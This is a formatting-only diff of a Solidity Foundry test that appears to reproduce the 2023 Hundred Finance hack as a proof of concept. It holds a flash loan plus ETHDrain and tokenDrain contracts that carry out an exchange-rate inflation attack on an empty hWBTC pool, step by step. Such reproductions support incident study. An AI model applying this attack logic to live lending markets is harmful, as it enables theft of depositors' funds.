@@ -14,9 +14,10 @@ import "./../interface.sol";
 // https://blog.hundred.finance/15-04-23-hundred-finance-hack-post-mortem-d895b618cf33
 
 interface IChainlinkPriceOracleProxy {
-    function getUnderlyingPrice(address cToken) external view returns (uint);
+    function getUnderlyingPrice(
+        address cToken
+    ) external view returns (uint256);
 }
-
 
 contract contractTest is Test {
     IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
@@ -69,10 +70,16 @@ contract contractTest is Test {
         aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);
 
         emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
-        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+        );
         emit log_named_decimal_uint("Attacker SNX balance after exploit", SNX.balanceOf(address(this)), SNX.decimals());
-        emit log_named_decimal_uint("Attacker sUSD balance after exploit", sUSD.balanceOf(address(this)), sUSD.decimals());
-        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals());
+        emit log_named_decimal_uint(
+            "Attacker sUSD balance after exploit", sUSD.balanceOf(address(this)), sUSD.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
+        );
         emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
     }
 
@@ -118,7 +125,9 @@ contract contractTest is Test {
         console.log("\r");
     }
 
-    function tokenDrains(ICErc20Delegate hToken) internal {
+    function tokenDrains(
+        ICErc20Delegate hToken
+    ) internal {
         uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
         bytes memory creationBytecode = gettokenDrainCreationBytecode(address(hToken));
         address DrainAddress = getAddress(creationBytecode, _salt);
@@ -133,22 +142,32 @@ contract contractTest is Test {
         console.log("\r");
     }
 
-    function getLiquidationRepayAmount(address hToken) public view returns (uint256) {
+    function getLiquidationRepayAmount(
+        address hToken
+    ) public view returns (uint256) {
         uint256 exchangeRate = hWBTC.exchangeRateStored();
-        uint256 liquidationIncentiveMantissa = 1080000000000000000;
+        uint256 liquidationIncentiveMantissa = 1_080_000_000_000_000_000;
         uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hToken));
         uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));
         uint256 hTokenAmount = 1;
-        uint256 liquidateAmount = 1e18/(priceBorrowedMantissa * liquidationIncentiveMantissa / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)) + 1;
+        uint256 liquidateAmount = 1e18
+            / (
+                priceBorrowedMantissa * liquidationIncentiveMantissa
+                    / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)
+            ) + 1;
         return liquidateAmount;
     }
 
-    function getETHDrainCreationBytecode(address token) public pure returns (bytes memory) {
+    function getETHDrainCreationBytecode(
+        address token
+    ) public pure returns (bytes memory) {
         bytes memory bytecode = type(ETHDrain).creationCode;
         return abi.encodePacked(bytecode, abi.encode(token));
     }
 
-    function gettokenDrainCreationBytecode(address token) public pure returns (bytes memory) {
+    function gettokenDrainCreationBytecode(
+        address token
+    ) public pure returns (bytes memory) {
         bytes memory bytecode = type(tokenDrain).creationCode;
         return abi.encodePacked(bytecode, abi.encode(token));
     }
@@ -167,16 +186,25 @@ contract ETHDrain is Test {
     IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
     crETH CEtherDelegate;
 
-    constructor(crETH Delegate) payable {
+    constructor(
+        crETH Delegate
+    ) payable {
         console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
         CEtherDelegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
         hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
-        console2.log("ETHDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:", WBTC.balanceOf(address(hWBTC)));
+        console2.log(
+            "ETHDrain's share in hWBTC:",
+            hWBTC.balanceOf(address(this)),
+            "the WBTC amount in hWBTC:",
+            WBTC.balanceOf(address(hWBTC))
+        );
         console.log("\r");
 
-        console.log("Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)");
+        console.log(
+            "Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)"
+        );
         (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
         console.log("exchangeRate before manipulation:", exchangeRate_1);
         uint256 donationAmount = WBTC.balanceOf(address(this));
@@ -197,11 +225,24 @@ contract ETHDrain is Test {
 
         console.log("Fouth step, redeem WBTC from the hWBTC pool");
         uint256 redeemAmount = donationAmount - 1;
-        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
-        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
-        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
+        console.log(
+            "Calculate the amount of shares represented by the redeem amount:",
+            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+        );
+        console.log(
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+        );
+        console.log(
+            "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
+            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+        );
         hWBTC.redeemUnderlying(redeemAmount);
-        console2.log("after redeem the ETHDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:", WBTC.balanceOf(address(hWBTC)));
+        console2.log(
+            "after redeem the ETHDrain's share in hWBTC:",
+            hWBTC.balanceOf(address(this)),
+            "the WBTC amount in hWBTC:",
+            WBTC.balanceOf(address(hWBTC))
+        );
         console.log("\r");
 
         console.log("Firth step, send WBTC to exploiter");
@@ -218,16 +259,25 @@ contract tokenDrain is Test {
     IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);
     ICErc20Delegate CErc20Delegate;
 
-    constructor(ICErc20Delegate Delegate) payable {
+    constructor(
+        ICErc20Delegate Delegate
+    ) payable {
         console.log("First step, Deposit a small amount of WBTC to the empty hWBTC pool to obtain shares");
         CErc20Delegate = Delegate;
         WBTC.approve(address(hWBTC), type(uint256).max);
         hWBTC.mint(4 * 1e8);
         hWBTC.redeem(hWBTC.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
-        console2.log("toeknDrain's share in hWBTC:", hWBTC.balanceOf(address(this)), "the WBTC amount in hWBTC:", WBTC.balanceOf(address(hWBTC)));
+        console2.log(
+            "toeknDrain's share in hWBTC:",
+            hWBTC.balanceOf(address(this)),
+            "the WBTC amount in hWBTC:",
+            WBTC.balanceOf(address(hWBTC))
+        );
         console.log("\r");
 
-        console.log("Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)");
+        console.log(
+            "Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)"
+        );
         (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
         console.log("exchangeRate before manipulation:", exchangeRate_1);
         uint256 donationAmount = WBTC.balanceOf(address(this));
@@ -249,11 +299,24 @@ contract tokenDrain is Test {
 
         console.log("Fouth step, redeem WBTC from the hWBTC pool");
         uint256 redeemAmount = donationAmount;
-        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
-        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
-        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC);
+        console.log(
+            "Calculate the amount of shares represented by the redeem amount:",
+            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+        );
+        console.log(
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+        );
+        console.log(
+            "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
+            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+        );
         hWBTC.redeemUnderlying(redeemAmount);
-        console2.log("after redeem the toeknDrain's share in hWBTC:", hWBTC.balanceOf(address(this)),"the WBTC amount in hWBT:C", WBTC.balanceOf(address(hWBTC)));
+        console2.log(
+            "after redeem the toeknDrain's share in hWBTC:",
+            hWBTC.balanceOf(address(this)),
+            "the WBTC amount in hWBT:C",
+            WBTC.balanceOf(address(hWBTC))
+        );
         console.log("\r");
 
         console.log("Firth step, send WBTC to exploiter");
